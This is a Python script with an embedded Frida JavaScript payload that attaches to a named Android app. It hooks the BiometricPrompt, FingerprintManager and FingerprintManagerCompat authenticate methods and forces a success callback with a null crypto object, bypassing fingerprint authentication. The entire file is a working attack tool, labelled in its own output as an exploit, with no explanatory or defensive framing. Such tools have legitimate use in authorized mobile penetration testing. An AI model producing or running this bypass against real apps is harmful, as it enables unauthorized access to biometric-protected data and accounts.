#!/usr/bin/env python3

# Credit: Mateusz Frub
# Bypass fingerprint authentication if the app accept NULL cryptoObject in onAuthenticationSucceeded().
# This script should automatically bypass fingerprint when authenticate() method will be called.

import frida
import sys

package_name = "INSERT_PACKAGE_HERE"

script = """
var cipherList = [];
var StringCls = null;
Java.perform(function () {
    StringCls = Java.use('java.lang.String');
});

function getAuthResult(result, instance) {
    try {
        var authenticationResultInst = result.$new(instance, null, 0);
    } catch (error) {
        try {
            var authenticationResultInst = result.$new(instance, null);
        }
        catch (error) {
            var authenticationResultInst = result.$new(instance);
        }
    }
    console.log("[ + ] Instance: " + instance + " Class: " + instance.$className);
    return authenticationResultInst;
}

function getBiometricPromptAuthResult() {
    var sweet_cipher = null;
    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
    var instance = cryptoObj.$new(sweet_cipher);
    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    var authenticationResultInst = getAuthResult(authenticationResultObj, instance);
    return authenticationResultInst
}

function hookBiometricPrompt_authenticate1() {
    console.log("[ + ] Hooking BiometricPrompt.authenticate()...");
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
        console.log("[ + ] CancellationSignal: " + cancellationSignal + " Executor: " + " Callback: " + callback);
        var authenticationResultInst = getBiometricPromptAuthResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
    }
}

function hookBiometricPrompt_authenticate2() {
    console.log("[ + ] Hooking BiometricPrompt.authenticate2()...");
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    biometricPrompt.implementation = function (crypto, cancellationSignal, executor, callback) {
        console.log("[ + ] Crypto:" + crypto + " CancellationSignal: " + cancellationSignal + " Executor: " + " Callback: " + callback);
        var authenticationResultInst = getBiometricPromptAuthResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
    }
}

function hookFingerprintManagerCompat_authenticate() {
    var fingerprintManagerCompat = null;
    var cryptoObj = null;
    var authenticationResultObj = null;
    try {
        fingerprintManagerCompat = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat');
        cryptoObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
        authenticationResultObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
    } catch (error) {
        try {
            fingerprintManagerCompat = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat');
            cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
            authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
        }
        catch (error) {
            console.log("[ - ] FingerprintManagerCompat class not found!");
            return;
        }
    }
    console.log("[ + ] Hooking FingerprintManagerCompat.authenticate()...");
    var fingerprintManagerCompat_authenticate = fingerprintManagerCompat['authenticate'];
    fingerprintManagerCompat_authenticate.implementation = function (crypto, flags, cancel, callback, handler) {
        console.log("[ + ] Crypto: " + crypto + " Flags: " + flags + " Cancel:" + cancel + " Callback: " + callback + " Handler: " + handler);
        callback['onAuthenticationFailed'].implementation = function () {
            console.log("[ + ] onAuthenticationFailed() called...");
            var sweet_cipher = null;
            var instance = cryptoObj.$new(sweet_cipher);
            var authenticationResultInst = getAuthResult(authenticationResultObj, instance);
            callback.onAuthenticationSucceeded(authenticationResultInst);
        }
        return this.authenticate(crypto, flags, cancel, callback, handler);
    }
}

function hookFingerprintManager_authenticate() {
    var fingerprintManager = null;
    var cryptoObj = null;
    var authenticationResultObj = null;
    try {
        fingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        cryptoObj = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
        authenticationResultObj = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
    } catch (error) {
        try {
            fingerprintManager = Java.use('androidx.core.hardware.fingerprint.FingerprintManager');
            cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$CryptoObject');
            authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$AuthenticationResult');
        }
        catch (error) {
            console.log("[ - ] FingerprintManager class not found!");
            return;
        }
    }

    console.log("[ + ] Hooking FingerprintManager.authenticate()...");

    var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
    fingerprintManager_authenticate.implementation = function (crypto, cancel, flags, callback, handler) {
        console.log("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
        var sweet_cipher = null;
        var instance = cryptoObj.$new(sweet_cipher);
        var authenticationResultInst = getAuthResult(authenticationResultObj, instance);
        callback.onAuthenticationSucceeded(authenticationResultInst);
        return this.authenticate(crypto, cancel, flags, callback, handler);
    }
}

console.log("[ + ] Fingerprint hooks loaded!");

Java.perform(function () {
    // Call in try catch as Biometric prompt is supported since api 28 (Android 9)
    try { hookBiometricPrompt_authenticate1(); }
    catch (error) { console.log("[ - ] hookBiometricPrompt_authenticate1 not supported on this android version") }
    try { hookBiometricPrompt_authenticate2(); }
    catch (error) { console.log("[ - ] hookBiometricPrompt_authenticate1 not supported on this android version") }
    try { hookFingerprintManagerCompat_authenticate(); }
    catch (error) { console.log("[ - ] hookFingerprintManagerCompat_authenticate failed"); }
    try { hookFingerprintManager_authenticate(); }
    catch (error) { console.log("[ - ] hookFingerprintManager_authenticate failed"); }
});
"""

try:
    print("[ * ] Looking for app: " + package_name)
    device = frida.get_usb_device(10)
    print("[ * ] Launching app...")
    pid = device.spawn([package_name])
    device.resume(pid)
    session = device.attach(pid)
    exploit = session.create_script(script)
    print("[ + ] App launched. Loading exploit...")
    exploit.load()
    sys.stdin.read()
except frida.ServerNotRunningError:
    print("[ - ] Frida server is not running! Exiting...")
except frida.NotSupportedError:
    print("[ - ] Unable to find application. Please, install it first!")
except frida.ProcessNotFoundError:
    print("[ - ] Unable to find process. Launch the app and try again!")
except KeyboardInterrupt:
    print("\n[ - ] Interrupted. Exiting...")
